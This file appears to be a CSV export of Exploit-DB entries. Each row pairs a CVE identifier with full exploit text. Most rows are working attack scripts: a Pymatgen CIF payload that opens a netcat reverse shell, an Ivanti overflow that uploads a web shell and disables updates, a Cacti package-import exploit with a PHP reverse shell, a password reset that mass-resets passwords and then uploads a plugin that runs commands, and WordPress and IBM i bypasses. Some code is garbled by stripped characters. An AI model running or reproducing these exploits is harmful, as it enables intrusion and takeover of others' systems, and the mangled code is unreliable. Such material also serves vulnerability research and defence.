CVE-2024-23346,"{""CVE-2024-23346"": 1}",2025-04-15,Pymatgen 2024.1 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52205,"Exploit Title : Pymatgen 2024.1 - Remote Code Execution (RCE) Google Dork : (not applicable) Date : 2024-11-13 Exploit Author : Mohammed Idrees Banyamer Vendor Homepage : https ://pymatgen.org Software Link : https ://pypi.org /project /pymatgen/ Version : 2024.1 Tested on : Kali Linux 2024.1 CVE : CVE-2024-23346 import os Function to create the malicious CIF file def createmaliciouscif(ip, port): Constructing the malicious CIF file with reverse shell payload maliciouscif = f"" data5yOhtAoR auditcreationdate 2024-11-13 auditcreationmethod ""CVE-2024-23346 Pymatgen CIF Parser Reverse Shell Exploit"" loop parentpropagationvector.id parentpropagationvector.kxkykz k1 [0 0 0] spacegroupmagn.transformBNSPpabc 'a,b,[d for d in ().class.mro[1].getattribute ( *[().class.mro[1]]+[""sub"" + ""classes""]) () if d.name == ""BuiltinImporter""][0].loadmodule (""os"").system (""nc {ip} {port} -e /bin/bash"");0,0,0' spacegroupmagn.numberBNS 62.448 spacegroupmagn.nameBNS ""P n' m a' "" Save to a file with open(""vuln.cif"", ""w"") as file: file.write(maliciouscif) print(""[*] Malicious CIF file created: vuln.cif"") Function to trigger the exploit by parsing the malicious CIF file def exploit(): ip = input(""Enter your IP address for the reverse shell: "") port = input(""Enter the port for the reverse shell to listen on: "") Create the malicious CIF file createmaliciouscif(ip, port) Trigger the Pymatgen CIF parser to parse the malicious file from pymatgen.io.cif import CifParser parser = CifParser(""vuln.cif"") structure = parser.parsestructures() Running the exploit if name == ""main"": exploit()"
CVE-2025-0282,"{""CVE-2025-0282"": 1}",2025-04-15,Ivanti Connect Secure 22.7R2.5 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52213,"Exploit Title: Ivanti Connect Secure 22.7R2.5 - Remote Code Execution (RCE) Date: 2025-01-11 Exploit Author: CVE: CVE-2025-0282 import requests import sys import struct import socket import ssl import urllib3 import time Disable SSL warnings urllib3.disablewarnings(urllib3.exceptions.InsecureRequestWarning) def createexploitpayload(command, offset=500, systemaddress=0x0804a360, commandaddress=0x0804b008): payload = b""A"" * offset Fill the buffer payload += struct.pack("" /shell.php"" exploitvulnerability(targetip, command) print(""[+] Web shell uploaded successfully at /shell.php."") verifyshell(targetip) except Exception as e: print(f""[-] Error uploading web shell: {e}"") def verifyshell(targetip): shellurl = f"" <URL> try: response = requests.get(shellurl, verify=False, timeout=10) if response.statuscode == 200: print(""[+] Web shell is accessible."") else: print(f""[-] Web shell is not accessible. HTTP status: {response.statuscode}"") except Exception as e: print(f""[-] Error verifying web shell: {e}"") def executeshellcommand(targetip, command): shellurl = f"" <URL> try: Sending the command via POST response = requests.post(shellurl, data={""cmd"": command}, verify=False, timeout=10) if response.statuscode == 200: print(f""[+] Command output:\n{response.text.strip()}"") else: print(f""[-] Failed to execute command via shell. HTTP status: {response.statuscode}"") except Exception as e: print(f""[-] Error executing command via web shell: {e}"") def disableupdates(targetip): commands = [ ""systemctl stop apt-daily.service"", ""systemctl disable apt-daily.service"" for command in commands: executeshellcommand(targetip, command) print(""[+] System updates disabled successfully."") def main(): if len(sys.argv) != 3: print(""Usage: python3 cve20250282.py "") sys.exit(1) targetip = sys.argv[1] localshellpath = sys.argv[2] Upload the web shell uploadwebshell(targetip, localshellpath) while True: command = input(""Enter command to execute on the target (or 'exit' to quit): "") if command.lower() == ""exit"": print(""Exiting."") break executeshellcommand(targetip, command) if name == ""main"": main()"
CVE-2024-52302,"{""CVE-2024-52302"": 1}",2025-04-15,Spring Boot common-user-management 0.1 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52206,"Exploit Title: Unrestricted File Upload Google Dork: Date: 14/Nov/2024 Exploit Author: d3sca Vendor Homepage: <URL> Software Link: <URL> Version: [app version] 0.1 Tested on: Debian Linux CVE : CVE-2024-52302 Steps to Reproduce: Upload Malicious File: Send a PUT request to /api/v1/customer/profile-picture using customer with role 26,17 added with a malicious file payload (e.g., .jsp, .php, .html). GET the file location: Send GET request /api/v1/customer/my-profile , grap the file location in response with the profile's link. Execute the Uploaded File: Using the file name access the file directly through the URL returned in the response. If the server supports the uploaded file type, it will execute the file, leading to Remote Code Execution. import requests import argparse import sys requests.packages.urllib3.disablewarnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) def login(url, username, password): ""Authenticate with the API and return the Bearer token."" loginendpoint = f""{url}/api/v1/user/login"" headers = {""Content-Type"": ""application/json""} payload = { ""username"": username, ""password"": password try: response = requests.post(loginendpoint, json=payload, headers=headers, verify=False) response.raiseforstatus() Extract token token = response.json().get(""token"") if not token: print(""[!] Token not found in response. Exiting."") sys.exit(1) print(""[+] Authentication successful. Token acquired."") return token except Exception as e: print(f""[!] Login failed: {e}"") sys.exit(1) def uploadfile(url, token, filepath): ""Upload a file to the profile picture endpoint using the Bearer token."" uploadendpoint = f""{url}/api/v1/customer/profile-picture"" headers = { ""Authorization"": f""Bearer {token}"" files = { ""file"": open(filepath, ""rb"") try: response = requests.post(uploadendpoint, headers=headers, files=files, verify=False) response.raiseforstatus() if response.statuscode == 200: print(""[+] File uploaded successfully."") print(f""[+] Response: {response.text}"") else: print(f""[!] Failed to upload file. Status code: {response.statuscode}"") print(f""[!] Response: {response.text}"") except Exception as e: print(f""[!] File upload failed: {e}"") sys.exit(1) def main(): parser = argparse.ArgumentParser(description=""Exploit script for unrestricted file upload vulnerability."") parser.addargument(""-u"", ""--username"", required=True, help=""Username for login"") parser.addargument(""-p"", ""--password"", required=True, help=""Password for login"") parser.addargument(""-f"", ""--file"", required=True, help=""File to upload"") parser.addargument(""-url"", ""--url"", required=True, help=""Base URL of the target application (e.g., <URL> args = parser.parseargs() Authenticate token = login(args.url, args.username, args.password) Upload the file uploadfile(args.url, token, args.file) if name == ""main"": main()"
CVE-2024-10924,"{""CVE-2024-10924"": 1}",2025-04-15,Really Simple Security 9.1.1.1 - Authentication Bypass,https://www.exploit-db.com/exploits/52207,"#!/usr/bin/env python3 Exploit Title: Really Simple Security 9.1.1.1 - Authentication Bypass Date: 2024-11-19 Exploit Author: Antonio Francesco Sardella Vendor Homepage: <URL> Software Link: <URL> Version: Really Simple Security (Free, Pro, and Pro Multisite) 9.0.0 - 9.1.1.1 Tested on: 'WordPress 6.7.0' in Docker container (vulnerable application), 'Ubuntu 24.04.1 LTS' with 'Python 3.12.3' (script execution) CVE: CVE-2024-10924 Category: WebApps Repository: <URL> Vulnerability discovered and reported by: István Márton This is a Python3 program that exploits Really Simple Security < 9.1.2 authentication bypass vulnerability. This makes it possible for unauthenticated attackers to log in as any existing user on the site, such as an administrator, when the ""Two-Factor Authentication"" setting is enabled (disabled by default). # <URL> # <URL> DISCLAIMER: This tool is intended for security engineers and appsec people for security assessments. Please use this tool responsibly. I do not take responsibility for the way in which any one uses this application. I am NOT responsible for any damages caused or any crimes committed by using this tool. import argparse import json import logging import random import requests import string import validators from requests.auth import HTTPBasicAuth VERSION = ""v1.0 (2024-11-19)"" DEFAULTLOGGINGLEVEL = logging.INFO def parsearguments(): parser = argparse.ArgumentParser( description=f""Exploit for Really Simple Security < 9.1.2 authentication bypass vulnerability (CVE-2024-10924). - {VERSION}"" parser.addargument(""-t"", ""--target"", required=True, help=""URL of the target WordPress"") parser.addargument(""-uid"", ""--user-id"", required=False, default=1, help=""Victim user ID (1 is usually the admin)."") parser.addargument(""-v"", ""--verbose"", action=""storetrue"", required=False, default=False, help=""verbose mode"") return parser.parseargs() def validateinput(args): try: validators.url(args.target) except validators.ValidationFailure: raise ValueError(""Invalid target URL!"") try: if int(args.userid) < 1: raise ValueError(""Invalid user ID!"") except ValueError: raise ValueError(""Invalid user ID!"") def sendrequest(url, userid): logging.info(""Sending request to target WordPress."") targetendpoint = f""{url}"" if not targetendpoint.endswith(""/""): targetendpoint = f""{targetendpoint}/"" targetendpoint = f""{targetendpoint}?restroute=/reallysimplessl/v1/twofa/skiponboarding"" headers = { ""Content-Type"": ""application/json"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"", body = { ""userid"": int(userid), ""loginnonce"": """".join(random.choices(string.digits, k=10)), ""redirectto"": ""/wp-admin/"" logging.debug(f""Body: {body}"") try: r = requests.post(targetendpoint, headers=headers, json=body , verify=False) logging.info(f""Request sent to target WordPress (HTTP {r.statuscode})."") except Exception as e: logging.fatal(""Error in contacting the target WordPress."") logging.fatal(e) return if r.statuscode == 200 and r.headers[""Set-Cookie""] is not None and ""redirectto"" in r.text and ""=deleted;"" not in r.headers[""Set-Cookie""]: logging.info(f""Cookie received:\n-\n{r.headers[""Set-Cookie""]}\n-"") else: logging.fatal(""Wrong response received from the target WordPress."") logging.debug(f""Cookie and body received:\n-\n{r.headers[""Set-Cookie""]}\n-\n{r.text}\n-"") def main(): args = parsearguments() logginglevel = DEFAULTLOGGINGLEVEL if args.verbose: logginglevel = logging.DEBUG logging.basicConfig(level=logginglevel, format=""%(asctime)s - %(levelname)s - %(message)s"") validateinput(args) target = args.target.strip() userid = int(args.userid) logging.info(f""Exploit for Really Simple Security < 9.1.2 authentication bypass vulnerability (CVE-2024-10924). - {VERSION}"") logging.debug(""Parameters:"") logging.debug(f"" target = {target}"") logging.debug(f"" userid = {userid}"") sendrequest(target, userid) logging.info(""Finished."") if name == ""main"": main()"
CVE-2024-50672,"{""CVE-2024-50672"": 1}",2025-04-15,Adapt Authoring Tool 0.11.3 - Remote Command Execution (RCE),https://www.exploit-db.com/exploits/52208,"Exploit Title: Adapt Authoring Tool 0.11.3 - Remote Command Execution (RCE) Date: 2024-11-24 Exploit Author: Eui Chul Chung Vendor Homepage: <URL> Software Link: <URL> Version: 0.11.3 CVE Identifier: CVE-2024-50672 , CVE-2024-50671 import io import sys import json import zipfile import argparse import requests import textwrap def getsessioncookie(username, password): data = {""email"": username, ""password"": password} res = requests.post(f""{args.url}/api/login"", data=data) if res.statuscode == 200: print(f""[+] Login as {username}"") return res.cookies.getdict() return None def getusers(): sessioncookie = getsessioncookie(args.username, args.password) if sessioncookie is None: print(""[-] Login failed"") sys.exit() res = requests.get(f""{args.url}/api/user"", cookies=sessioncookie) users = [ {""email"": user[""email""], ""role"": user[""roles""][0][""name""]} for user in json.loads(res.text) roles = {""Authenticated User"": 1, ""Course Creator"": 2, ""Super Admin"": 3} users.sort(key=lambda user: roles[user[""role""]]) for user in users: print(f""[+] {user['email']} ({user['role']})"") return users def resetpassword(users): Overwrite potentially expired password reset tokens for user in users: data = {""email"": user[""email""]} requests.post(f""{args.url}/api/createtoken"", data=data) print(""[+] Generate password reset token for every user"") validcharacters = ""0123456789abcdef"" nexttokens = [""^""] Ensure that only a single result is returned at a time while nexttokens: prevtokens = nexttokens nexttokens = [] for token in prevtokens: for ch in validcharacters: data = {""token"": {""$regex"": token + ch}, ""password"": ""HaXX0r3d!""} res = requests.put( f""{args.url}/api/userpasswordreset/w00tw00t"", json=data, Multiple results returned if res.statuscode == 500: nexttokens.append(token + ch) print(""[+] Reset every password to HaXX0r3d!"") def createplugin(pluginname): manifest = { ""name"": pluginname, ""version"": ""1.0.0"", ""extension"": ""exploit"", ""main"": ""/js/main.js"", ""displayName"": ""exploit"", ""keywords"": [""adapt-plugin"", ""adapt-extension""], ""scripts"": {""adaptpostcopy"": ""/scripts/postcopy.js""}, property = { ""properties"": { ""pluginLocations"": { ""type"": ""object"", ""properties"": {""course"": {""type"": ""object""}}, payload = textwrap.dedent( f"" const {{ exec }} = require(""childprocess""); module.exports = async function (fs, path, log, options, done) {{ try {{ exec(""{args.command}""); }} catch (err) {{ log(err); done(); ).strip() plugin = io.BytesIO() with zipfile.ZipFile(plugin, ""a"", zipfile.ZIPDEFLATED, False) as zipfile: zipfile.writestr( f""{pluginname}/bower.json"", io.BytesIO(json.dumps(manifest).encode()).getvalue(), zipfile.writestr( f""{pluginname}/properties.schema"", io.BytesIO(json.dumps(property).encode()).getvalue(), zipfile.writestr( f""{pluginname}/js/main.js"", io.BytesIO("""".encode()).getvalue() zipfile.writestr( f""{pluginname}/scripts/postcopy.js"", io.BytesIO(payload.encode()).getvalue(), plugin.seek(0) return plugin def findplugin(cookies, plugintype, pluginname): res = requests.get(f""{args.url}/api/{plugintype}type"", cookies=cookies) for plugin in json.loads(res.text): if plugin[""name""] == pluginname: return plugin[""id""] return None def createcourse(cookies): data = {} res = requests.post(f""{args.url}/api/content/course"", cookies=cookies, json=data) courseid = json.loads(res.text)[""id""] data = {""courseId"": courseid, ""parentId"": courseid} res = requests.post( f""{args.url}/api/content/contentobject"", cookies=cookies, json=data, contentid = json.loads(res.text)[""id""] data = {""courseId"": courseid, ""parentId"": contentid} res = requests.post(f""{args.url}/api/content/article"", cookies=cookies, json=data) articleid = json.loads(res.text)[""id""] data = {""courseId"": courseid, ""parentId"": articleid} res = requests.post(f""{args.url}/api/content/block"", cookies=cookies, json=data) blockid = json.loads(res.text)[""id""] componentid = findplugin(cookies, ""component"", ""adapt-contrib-text"") data = { ""courseId"": courseid, ""parentId"": blockid, ""component"": ""text"", ""componentType"": componentid, requests.post(f""{args.url}/api/content/component"", cookies=cookies, json=data) return courseid def rce(users): sessioncookie = None for user in users: if user[""role""] == ""Super Admin"": sessioncookie = getsessioncookie(user[""email""], ""HaXX0r3d!"") break if sessioncookie is None: print(""[-] Failed to login as Super Account"") sys.exit() pluginname = ""adapt-contrib-xapi"" print(f""[+] Create malicious plugin : {pluginname}"") plugin = createplugin(pluginname) print(""[+] Scan installed plugins"") pluginid = findplugin(sessioncookie, ""extension"", pluginname) if pluginid is None: print(f""[+] {pluginname} not found"") else: print(f""[+] Found {pluginname}"") print(f""[+] Remove {pluginname}"") requests.delete( f""{args.url}/api/extensiontype/{pluginid}"", cookies=sessioncookie, print(""[+] Upload plugin"") files = {""file"": (f""{pluginname}.zip"", plugin, ""application/zip"")} requests.post( f""{args.url}/api/upload/contentplugin"", cookies=sessioncookie, files=files, print(""[+] Find uploaded plugin"") pluginid = findplugin(sessioncookie, ""extension"", pluginname) if pluginid is None: print(f""[-] {pluginname} not found"") sys.exit() print(f""[+] Plugin ID : {pluginid}"") print(""[+] Add plugin to new courses"") data = {""isAddedByDefault"": True} requests.put( f""{args.url}/api/extensiontype/{pluginid}"", cookies=sessioncookie, json=data, print(""[+] Create a new course"") courseid = createcourse(sessioncookie) print(""[+] Build course"") res = requests.get( f""{args.url}/api/output/adapt/preview/{courseid}"", cookies=sessioncookie, if res.statuscode == 200: print(""[+] Command execution succeeded"") else: print(""[-] Command execution failed"") print(""[+] Remove course"") requests.delete( f""{args.url}/api/content/course/{courseid}"", cookies=sessioncookie, def main(): print(""[] Retrieve user information"") users = get_users() print(""\n[] Reset password"") resetpassword(users) print(""\n[*] Perform remote code execution"") rce(users) if name == ""main"": parser = argparse.ArgumentParser() parser.addargument( ""-u"", dest=""url"", help=""Site URL (e.g. <URL> type=str, required=True, parser.addargument( ""-U"", dest=""username"", help=""Username to authenticate as"", type=str, required=True, parser.addargument( ""-P"", dest=""password"", help=""Password for the specified username"", type=str, required=True, parser.addargument( ""-c"", dest=""command"", help=""Command to execute (e.g. touch /tmp/pwned)"", type=str, default=""touch /tmp/pwned"", args = parser.parseargs() main()"
CVE-2024-41947,"{""CVE-2024-41947"": 1}",2025-04-15,OpenCMS 17.0 - Stored Cross Site Scripting (XSS),https://www.exploit-db.com/exploits/52209,"Exploit Title: OpenCMS 17.0 - Stored Cross Site Scripting (XSS) Date: 24-11-2024 Exploit Author: Siddhartha Naik Vendor Homepage: <URL> Software Link: <URL> Affected Version: 17.0 Category: WebApps Tested on: Windows 11 CVE : CVE-2024-41447 1. Vendor Description: OpenCms from Alkacon Software is a professional, easy to use website content management system. OpenCms helps content managers worldwide to create and maintain beautiful websites fast and efficiently. 2. Technical Description: This is a Stored XSS vulnerability in the author field seen when publishing an article. This vulnerability has been tested on latest versions of Brave and Firefox browsers. It is believed to affect any user who clicks on the ""Read More"" button of the affected article and can be exploited by any user who is able to modify/create articles. 3. Proof Of Concept: a) Start by creating a new article. In the author field write your script like so: b) Save and publish the article c) The user who clicks on the read more button gets a popup saying '1' 4. Solution: Upgrade to latest release. <URL> 5. Reference: <URL> <URL> <URL> <URL>"
CVE-2024-51464,"{""CVE-2024-51464"": 1}",2025-04-15,IBMi Navigator 7.5 -  HTTP Security Token Bypass,https://www.exploit-db.com/exploits/52210,"Author Title: John Page (aka hyp3rlinx) Author Website: hyp3rlinx.altervista.org Source: <URL> Vendor: <URL> [Product] Navigator for i is a Web console interface where you can perform the key tasks to administer your IBM i. IBM Navigator for i supports the vast majority of tasks that were available in the System i Navigator Windows client application. This Web application is part of the base IBM i operating system, and can be easily accessed from your web browser. [Vulnerability Type] HTTP Security Token Bypass [CVE Reference] CVE-2024-51464 [Security Issue] IBM i is vulnerable to bypassing Navigator for i interface restrictions. By sending a specially crafted request, an authenticated attacker could exploit this vulnerability to remotely perform operations that the user is not allowed to perform when using Navigator for i. The web application generates an HTTP security token ID called ""Mn:"" with a 19 digit value and is set in the HTTP session response header per user. Navigator, uses this token for integrity purpose to protect against arbitrary and or malicious HTTP requests. Therefore, upon receipt of a bogus security token in an HTTP request the server will respond with HTTP 403 Forbidden message. However, attackers can modify existing tokens to bypass the 403 Forbidden directive to achieve their objectives. Problem is Navigator security token logic does not properly create or detect if a security token is valid or if it has been tampered with. Attackers can manipulate the last eight digits of a token by setting them to all 0000s (zeroes) and or increment them by one, token length must be the same. This can trick the application into processing attacker controlled security tokens as the server thinks it is valid, this undermines the security of this protection. E.g. Valid HTTP header generated by the server. Mn: 6844795211344371559 Content-Length: 290 Origin: <URL> Example of a bogus but honored MN header token set by an attacker, padded with zeros and happily accepted by the backend servlet. Mn: 6844795211300000000 The MN token is generated in the ""initProtectionSetting"" java method. public void initProtectionSetting(HttpServletRequest request, HttpServletResponse response) { initEncryption(); initSession(); [ REDACTED ] setMagicNumber(magicNumber); response.setHeader(""MN"", magicNumber + """"); setUserAgent(request.getHeader(""User-Agent"")); In the (doFilter) Method we see the check for MN header which sends HTTP 403 on invalid tokens. String mnStr = hRequest.getHeader(""MN""); if (mnStr == null) mnStr = hRequest.getParameter(""MN""); if (!isMnMatched(mnStr, hSession)) { NavLogger.severe(""Forbidden. Incorrect HTTP ID""); NavLogger.info(""Request URI: "" + requestURI); hResponse.sendError(403); return; Invalid token response will return: Error 403: SRVE38895F: Error reported: 403 Attacker increments MN or pad with zeros and requests are accepted and the token succeeds. HTTP 200 OK [References] ADV0142855 <URL> IBM classified as ""CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax"". To be clear HTTP headers are just the delivery method for sending attacker controlled tokens to bypass Navigator protection. [Exploit/"
CVE-2024-51463,"{""CVE-2024-51463"": 1}",2025-04-15,IBMi Navigator 7.5 - Server Side Request Forgery (SSRF),https://www.exploit-db.com/exploits/52212,"Author Title: John Page (aka hyp3rlinx) Author Website: hyp3rlinx.altervista.org Source: <URL> Vendor: <URL> [Vendor] <URL> [Product] Navigator for i is a Web console interface where you can perform the key tasks to administer your IBM i. IBM Navigator for i supports the vast majority of tasks that were available in the System i Navigator Windows client application. This Web application is part of the base IBM i operating system, and can be easily accessed from your web browser. [Vulnerability Type] Server Side Request Forgery (SSRF) [CVE Reference] CVE-2024-51463 [Security Issue] IBM i is vulnerable to server-side request forgery (SSRF). This may allow an authenticated attacker to send unauthorized requests from the system, potentially leading to network enumeration or facilitating other attacks. post auth server side request forgery on non managed nodes to external hosts on any TCP ports. There are two call vectors that can be abused here, one is the ""Test TLS connection"" but it only allows connections to TCP port 9476. However, there exists another servlet method called ""testConnectPort"" which an authenticated attacker can use to connect to any IP and PORT outside of the LAN. This can be abused for port scans, information disclosure, exfil data., bypass firewall rules to attack non managed nodes or connect to attacker controlled C2 infrastructure. This SSRF relies on exploiting a HTTP servlet generated security token bypass CVE-2024-51464, where intercepted HTTP request MN tokens are incremented or padded with zero. This attacker controlled MN token is now seen as valid and the HTTP 403 Forbidden restriction is bypassed. [Exploit/"
CVE-2024-25641,"{""CVE-2024-25641"": 1}",2025-04-15,Cacti 1.2.26 -  Remote Code Execution (RCE) (Authenticated),https://www.exploit-db.com/exploits/52225,"Exploit Title: Cacti 1.2.26 - Remote Code Execution (RCE) (Authenticated) Date: 06/01/2025 Exploit Author: D3Ext Vendor Homepage: <URL> Software Link: <URL> Version: 1.2.26 Tested on: Kali Linux 2024 CVE: CVE-2024-25641 #!/usr/bin/python3 import os import requests import base64 import gzip import time import argparse import string import random from bs4 import BeautifulSoup from cryptography.hazmat.primitives import hashes from cryptography.hazmat.primitives.asymmetric import padding, rsa from cryptography.hazmat.primitives import serialization def getrandomstring(length): letters = string.asciilowercase resultstr = ''.join(random.choice(letters) for i in range(length)) return resultstr def checkversion(urltocheck): r = requests.get(urltocheck) response = r.text if ""Cacti CHANGELOG"" in response and ""1.2.26"" in response and ""1.2.27"" not in response: print(""[+] Version seems to be 1.2.26"") else: print(""[-] Version doesn't seem to be 1.2.26, proceeding anyway"") Main function if name == 'main': p = argparse.ArgumentParser(description=""CVE-2024-25641 - Cacti 1.2.26 Authenticated RCE"") p.addargument('--url', help=""URL of the Cacti web root"", required=True) p.addargument('--user', help=""username to log in"", required=True) p.addargument('--password', help=""password of the username"", required=True) p.addargument('--lhost', help=""local host to receive the reverse shell"", required=True) p.addargument('--lport', help=""local port to receive the reverse shell"", required=True) p.addargument('--verbose', help=""enable verbose"", action='storetrue', default=False, required=False) Parse CLI arguments parser = p.parseargs() url = parser.url username = parser.user password = parser.password lhost = parser.lhost lport = parser.lport verbose = parser.verbose url = url.rstrip(""/"") print(""CVE-2024-25641 - Cacti 1.2.26 Authenticated RCE\n"") check if versions match print(""[] Checking Cacti version."") time.sleep(0.5) check = check_version(url + ""/CHANGELOG"") if check == False: sys.exit(0) req = requests.Session() if verbose: print(""[] Capturing CSRF token."") r = req.get(url) extract CSRF token soup = BeautifulSoup(r.text, 'html.parser') htmlparser = soup.find('input', {'name': 'csrfmagic'}) csrftoken = htmlparser.get('value') if verbose: print(""[+] CSRF token: "" + csrftoken) print(""[*] Logging in on "" + url + ""/index.php"") define login post data logindata = { 'csrf_magic': csrf_token, 'action': 'login', 'login_username': username, 'login_password': password, 'remember_me': 'on' send login request r = req.post(url + ""/index.php"", data=login_data) check success if 'Logged in' in r.text: print(""[+] Successfully logged in as "" + username) else: print(""[-] An error has ocurred while logging in as "" + username) sys.exit(0) generate random filename random_name = get_random_string(10) random_filename = random_name + "".php"" payload = "" array(""pipe"", ""r""), // stdin is a pipe that the child will read from 1 => array(""pipe"", ""w""), // stdout is a pipe that the child will write to 2 => array(""pipe"", ""w"") // stderr is a pipe that the child will write to $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(""ERROR: Can't spawn shell""); exit(1); stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(""Successfully opened reverse shell to $ip:$port""); while (1) { if (feof($sock)) { printit(""ERROR: Shell connection terminated""); break; if (feof($pipes[1])) { printit(""ERROR: Shell process terminated""); break; $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(""SOCK READ""); $input = fread($sock, $chunk_size); if ($debug) printit(""SOCK: $input""); fwrite($pipes[0], $input); if (in_array($pipes[1], $read_a)) { if ($debug) printit(""STDOUT READ""); $input = fread($pipes[1], $chunk_size); if ($debug) printit(""STDOUT: $input""); fwrite($sock, $input); if (in_array($pipes[2], $read_a)) { if ($debug) printit(""STDERR READ""); $input = fread($pipes[2], $chunk_size); if ($debug) printit(""STDERR: $input""); fwrite($sock, $input); fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print ""$string\n""; generate payload print(""[*] Generating malicious payload."") keypair = rsa.generate_private_key(public_exponent=65537, key_size=2048) public_key = keypair.public_key().public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) file_signature = keypair.sign(payload.encode('utf-8'), padding.PKCS1v15(), hashes.SHA256()) b64_payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8') b64_file_signature = base64.b64encode(file_signature).decode('utf-8') b64_public_key = base64.b64encode(public_key).decode('utf-8') data = "" resource/"" + random_filename + "" "" + b64_payload + "" "" + b64_file_signature + "" "" + b64_public_key + "" "" signature = keypair.sign(data.encode('utf-8'), padding.PKCS1v15(), hashes.SHA256()) final_data = data.replace("" "", "" "" + base64.b64encode(signature).decode('utf-8') + "" "").encode('utf-8') write gzip data f = open(random_filename + "".gz"", ""wb"") f.write(gzip.compress(final_data)) f.close() print(""[+] Malicious GZIP: "" + random_filename + "".gz"") define post data post_data = { 'csrfmagic': csrftoken, 'trustsigner': 'on', 'savecomponentimport': 1, 'action': 'save' upload file print(""[*] Uploading GZIP file."") send post request r = req.post(url + ""/packageimport.php?packagelocation=0&previewonly=on&removeorphans=on&replacesvalues=on"", data=postdata, files={'importfile': open(randomfilename + "".gz"", 'rb')}) print(""[+] Successfully uploaded GZIP file"") time.sleep(0.5) print(""[*] Validating success."") soup = BeautifulSoup(r.text, 'html.parser') htmlparser = soup.find('input', {'title': ""/var/www/html/cacti/resource/"" + randomfilename}) fileid = htmlparser.get('id') postdata = { 'csrfmagic': csrftoken, 'trustsigner': 'on', 'datasourceprofile': 1, 'removeorphans': 'on', 'replacesvalues': 'on', fileid: 'on', 'savecomponentimport': 1, 'previewonly': '', 'action': 'save', r = req.post(url + ""/packageimport.php?header=false"", data=postdata) print(""[+] Success!"") time.sleep(0.5) print(""[*] Triggering reverse shell by sending GET request to "" + url + ""/resource/"" + randomfilename) time.sleep(0.2) print(""[+] Check your netcat listener"") remove payload file os.remove(randomfilename + "".gz"") r = req.get(url + ""/resource/"" + randomfilename)"
CVE-2024-6516,"{""CVE-2024-6516"": 1}",2025-04-15,ABB Cylon Aspect 3.08.02 (licenseServerUpdate.php) - Stored Cross-Site Scripting,https://www.exploit-db.com/exploits/52214,"ABB Cylon Aspect 3.08.02 (licenseServerUpdate.php) Stored Cross-Site Scripting Vendor: ABB Ltd. Product web page: <URL> Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.08.02 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The ABB BMS/BAS controller suffers from an authenticated stored cross-site scripting vulnerability. Input passed to the 'host' POST parameter is not properly sanitised before being returned to the user. This can be exploited to execute arbitrary HTML/JS code in a user's browser session in context of an affected site. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x8664) GNU/Linux 2.6.32 (x8664) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) ErgoTech MIX Deployment Server 2.0.0 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic Advisory ID: ZSL-2025-5906 Advisory URL: <URL> CVE ID: CVE-2024-6516 CVE URL: CVE URL: <URL> 21.04.2024 P R O J E C T"
CVE-2024-6516,"{""CVE-2024-6516"": 1}",2025-04-15,ABB Cylon Aspect 3.08.02 (licenseUpload.php) - Stored Cross-Site Scripting,https://www.exploit-db.com/exploits/52215,"ABB Cylon Aspect 3.08.02 (licenseUpload.php) Stored Cross-Site Scripting Vendor: ABB Ltd. Product web page: <URL> Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.08.02 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The ABB Cylon Aspect BMS/BAS controller suffers from an authenticated stored cross-site scripting (XSS) vulnerability. This can be exploited by uploading a malicious .txt file containing an XSS payload, which is stored on the server and served back to users. Although the filename is sanitized via the filename POST parameter, the file contents are not inspected or sanitized, allowing attackers to inject arbitrary client-side scripts that execute in the context of any user accessing the infected file or related web page (license.php). To bypass file upload checks, the request must include the Variant string enabling the upload process for potential exploitation. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x8664) GNU/Linux 2.6.32 (x8664) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) ErgoTech MIX Deployment Server 2.0.0 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic Advisory ID: ZSL-2025-5905 Advisory URL: <URL> CVE ID: CVE-2024-6516 CVE URL: CVE URL: <URL> 21.04.2024 P R O J E C T"
